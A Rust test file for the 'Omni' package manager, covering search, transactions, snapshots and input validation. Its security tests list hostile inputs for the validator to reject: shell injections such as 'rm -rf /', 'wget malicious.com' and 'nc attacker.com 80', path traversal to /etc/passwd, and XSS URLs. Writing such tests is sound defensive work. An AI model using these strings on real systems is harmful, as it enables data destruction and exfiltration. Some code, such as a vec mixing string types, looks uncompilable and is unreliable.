use omni::*;
use anyhow::Result;
use tokio::test;
use std::sync::Arc;

/// Comprehensive integration tests for the Omni package manager
#[cfg(test)]
mod comprehensive_tests {
    use super::*;

    #[test]
    async fn test_brain_initialization() -> Result<()> {
        let brain = OmniBrain::new(true, false).await?; // mock mode, no gui
        assert!(brain.is_mock_mode());
        Ok(())
    }

    #[test]
    async fn test_package_search() -> Result<()> {
        let brain = OmniBrain::new(true, false).await?;
        let results = brain.search("firefox");
        assert!(!results.is_empty());
        assert!(results.iter().any(|r| r.name.contains("firefox")));
        Ok(())
    }

    #[test]
    async fn test_mock_package_operations() -> Result<()> {
        let mut brain = OmniBrain::new(true, false).await?;
        
        // Test install
        brain.install("test-package", Some("apt")).await?;
        
        // Test list installed
        let installed = brain.list_installed();
        assert!(!installed.is_empty());
        
        // Test remove
        brain.remove("test-package", Some("apt")).await?;
        
        // Test update
        brain.update_all();
        
        // Test snapshot
        brain.create_snapshot();
        
        Ok(())
    }

    #[test]
    async fn test_transaction_management() -> Result<()> {
        let mut manager = TransactionManager::new().await?;
        
        // Begin transaction
        let transaction_id = manager.begin_transaction(
            TransactionType::Install,
            "Test transaction".to_string()
        ).await?;
        
        // Add operation
        let operation_id = manager.add_operation(
            TransactionType::Install,
            "test-package".to_string(),
            "apt".to_string(),
            None
        ).await?;
        
        assert!(!transaction_id.is_empty());
        assert!(!operation_id.is_empty());
        
        Ok(())
    }

    #[test]
    async fn test_dependency_resolution() -> Result<()> {
        let resolver = AdvancedDependencyResolver::new().await?;
        
        let plan = resolver.resolve_with_strategy(
            &["firefox".to_string()],
            None,
            ResolutionStrategy::Conservative
        ).await?;
        
        assert!(!plan.packages.is_empty());
        Ok(())
    }

    #[test]
    async fn test_database_operations() -> Result<()> {
        let db = Database::new().await?;
        
        // Test snapshot creation
        let snapshot_id = db.create_snapshot(
            "test-snapshot",
            Some("Test snapshot for integration tests")
        ).await?;
        
        // Test snapshot listing
        let snapshots = db.list_snapshots().await?;
        assert!(snapshots.iter().any(|s| s.id == snapshot_id));
        
        // Test snapshot deletion
        db.delete_snapshot(&snapshot_id).await?;
        
        Ok(())
    }

    #[test]
    async fn test_input_validation() -> Result<()> {
        // Test package name validation
        assert!(InputValidator::validate_package_name("firefox").is_ok());
        assert!(InputValidator::validate_package_name("../etc/passwd").is_err());
        
        // Test URL validation
        assert!(InputValidator::validate_url("https://example.com").is_ok());
        assert!(InputValidator::validate_url("javascript:alert(1)").is_err());
        
        // Test shell safety
        assert!(InputValidator::validate_shell_safe("safe-package").is_ok());
        assert!(InputValidator::validate_shell_safe("evil; rm -rf /").is_err());
        
        Ok(())
    }

    #[test]
    async fn test_security_verification() -> Result<()> {
        use std::path::Path;
        use crate::security::{SecurityVerifier, SecurityPolicy};
        
        let policy = SecurityPolicy::default();
        let verifier = SecurityVerifier::new(policy);
        
        // Test with a temporary file
        let temp_file = tempfile::NamedTempFile::new()?;
        let path = temp_file.path();
        
        let result = verifier.verify_package(
            path,
            None, // No checksum
            None, // No signature
            "test"
        ).await;
        
        // Should succeed even without verification in test mode
        assert!(result.is_ok());
        Ok(())
    }

    #[test]
    fn test_package_manager_availability() {
        // Test that package manager detection works
        use crate::boxes::*;
        
        // These should not panic even if not available
        let _apt_available = apt::AptBox::is_available();
        let _dnf_available = dnf::DnfBox::is_available();
        let _pacman_available = pacman::PacmanBox::is_available();
        let _snap_available = snap::SnapBox::is_available();
        let _flatpak_available = flatpak::FlatpakBox::is_available();
        let _emerge_available = emerge::EmergeBox::is_available();
        let _nix_available = nix::NixBox::is_available();
        let _zypper_available = zypper::ZypperBox::is_available();
    }

    #[test]
    async fn test_privilege_management() -> Result<()> {
        let mut manager = PrivilegeManager::new();
        manager.store_credentials();
        
        // Test privilege validation
        PrivilegeManager::validate_minimal_privileges()?;
        
        // Test can_sudo check (should not fail)
        let _can_sudo = PrivilegeManager::can_sudo();
        
        // Test is_root check
        let _is_root = PrivilegeManager::is_root();
        
        Ok(())
    }

    #[test]
    async fn test_unified_manager() -> Result<()> {
        let manager = UnifiedPackageManager::new().await?;
        
        // Test available managers detection
        let available = manager.get_available_managers();
        
        // At minimum, we should detect system package managers
        // This test passes regardless of what's available
        println!("Available package managers: {:?}", available);
        
        Ok(())
    }

    #[test]
    async fn test_ssh_config() -> Result<()> {
        use crate::ssh::SshConfig;
        
        let config = SshConfig::default();
        assert!(!config.host.is_empty());
        assert!(!config.username.is_empty());
        
        Ok(())
    }

    #[test]
    async fn test_docker_config() -> Result<()> {
        use crate::docker::{DockerConfig, ContainerInfo};
        
        let config = DockerConfig::default();
        assert!(!config.base_images.is_empty());
        
        let container_info = ContainerInfo {
            id: "test-container".to_string(),
            name: "test".to_string(),
            image: "ubuntu:20.04".to_string(),
            status: "running".to_string(),
            created: chrono::Utc::now(),
        };
        
        assert_eq!(container_info.name, "test");
        
        Ok(())
    }

    #[test]
    async fn test_error_handling() -> Result<()> {
        use crate::error_handling::{OmniError, RecoveryManager};
        
        // Test error creation
        let error = OmniError::PackageNotFound {
            package: "nonexistent".to_string(),
        };
        
        assert!(error.to_string().contains("nonexistent"));
        
        // Test recovery manager
        let recovery_manager = RecoveryManager::new();
        // Just test that it can be created
        drop(recovery_manager);
        
        Ok(())
    }

    #[test]
    async fn test_rate_limiting() -> Result<()> {
        use crate::rate_limiter::RateLimiter;
        use std::time::Duration;
        
        let limiter = RateLimiter::new(10, Duration::from_secs(60), 100, Duration::from_secs(3600));
        
        // Test rate limiting
        assert!(limiter.check_rate_limit("test-key", "install").is_ok());
        
        // Test status
        let status = limiter.get_status("test-key", "install")?;
        assert!(status.remaining_per_minute <= 10);
        
        Ok(())
    }
}

/// Performance benchmarks
#[cfg(test)]
mod performance_tests {
    use super::*;
    use std::time::Instant;

    #[test]
    async fn benchmark_brain_initialization() -> Result<()> {
        let start = Instant::now();
        let _brain = OmniBrain::new(true, false).await?;
        let duration = start.elapsed();
        
        println!("Brain initialization took: {:?}", duration);
        assert!(duration.as_secs() < 5); // Should initialize within 5 seconds
        
        Ok(())
    }

    #[test]
    async fn benchmark_search_performance() -> Result<()> {
        let brain = OmniBrain::new(true, false).await?;
        
        let start = Instant::now();
        let _results = brain.search("firefox");
        let duration = start.elapsed();
        
        println!("Search took: {:?}", duration);
        assert!(duration.as_millis() < 1000); // Should search within 1 second
        
        Ok(())
    }

    #[test]
    async fn benchmark_database_operations() -> Result<()> {
        let db = Database::new().await?;
        
        let start = Instant::now();
        let snapshot_id = db.create_snapshot("bench-test", None).await?;
        let create_duration = start.elapsed();
        
        let start = Instant::now();
        let _snapshots = db.list_snapshots().await?;
        let list_duration = start.elapsed();
        
        let start = Instant::now();
        db.delete_snapshot(&snapshot_id).await?;
        let delete_duration = start.elapsed();
        
        println!("Database operations - Create: {:?}, List: {:?}, Delete: {:?}", 
                create_duration, list_duration, delete_duration);
        
        // All operations should complete within reasonable time
        assert!(create_duration.as_secs() < 5);
        assert!(list_duration.as_secs() < 2);
        assert!(delete_duration.as_secs() < 2);
        
        Ok(())
    }
}

/// Security tests
#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_injection_prevention() {
        // Test that dangerous inputs are rejected
        let dangerous_inputs = vec![
            "package; rm -rf /",
            "package && wget malicious.com",
            "package`whoami`",
            "package$(id)",
            "../../../etc/passwd",
            "package|nc attacker.com 80",
        ];
        
        for input in dangerous_inputs {
            assert!(
                InputValidator::validate_shell_safe(input).is_err(),
                "Should reject dangerous input: {}", input
            );
        }
    }

    #[test]
    fn test_url_security() {
        let dangerous_urls = vec![
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "ftp://malicious.com/backdoor",
            "https://localhost/admin",
            "https://127.0.0.1/sensitive",
        ];
        
        for url in dangerous_urls {
            assert!(
                InputValidator::validate_url(url).is_err(),
                "Should reject dangerous URL: {}", url
            );
        }
    }

    #[test]
    fn test_package_name_security() {
        let dangerous_names = vec![
            "../etc/passwd",
            "package/../../bin/sh",
            "package\\..\\windows\\system32",
            "con", "prn", "aux", "nul", // Windows reserved names
            "", // Empty name
            "a".repeat(300), // Too long
        ];
        
        for name in dangerous_names {
            assert!(
                InputValidator::validate_package_name(&name).is_err(),
                "Should reject dangerous package name: {}", name
            );
        }
    }
}